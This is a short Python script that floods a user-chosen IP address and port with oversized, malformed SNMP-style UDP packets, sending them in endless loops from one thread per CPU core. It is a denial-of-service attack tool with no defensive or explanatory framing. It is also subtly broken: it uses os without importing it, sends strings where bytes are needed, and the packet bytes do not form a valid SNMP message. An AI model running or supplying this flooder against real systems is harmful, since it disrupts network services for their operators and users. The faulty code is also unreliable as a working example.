import socket
import time
import threading

def send_snmp_request(target_ip, target_port, packet_size):
    msg_ver = "\x02\x01\x01"
    msg_community = "\x04\x06\x70\x75\x62\x6c\x69\x63"
    msg_pdu = "\xA2"
    msg_value = "\x02\x04" + "\x00" * 4

    # create a socket object
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    try:
        # set a timeout value for the socket
        client_socket.settimeout(2)

        # connect to the target IP and port
        client_socket.connect((target_ip, target_port))

        while True:
            client_socket.send(msg_ver + msg_community + msg_pdu + msg_value + "A" * packet_size)

    except socket.error as e:
        print("Error: Failed to send SNMP request -", e)

    finally:
        client_socket.close()

# prompt the user for target IP address, port, and packet size
target_ip = input("Enter the target IP address: ")
target_port = int(input("Enter the SNMP port: "))
packet_size = int(input("Enter the packet size (in bytes): "))

# calculate the number of threads based on the number of CPU cores available
num_threads = os.cpu_count()

# create and start the threads
threads = []
for _ in range(num_threads):
    thread = threading.Thread(target=send_snmp_request, args=(target_ip, target_port, packet_size))
    thread.start()
    threads.append(thread)

# wait for all threads to finish
for thread in threads:
    thread.join()
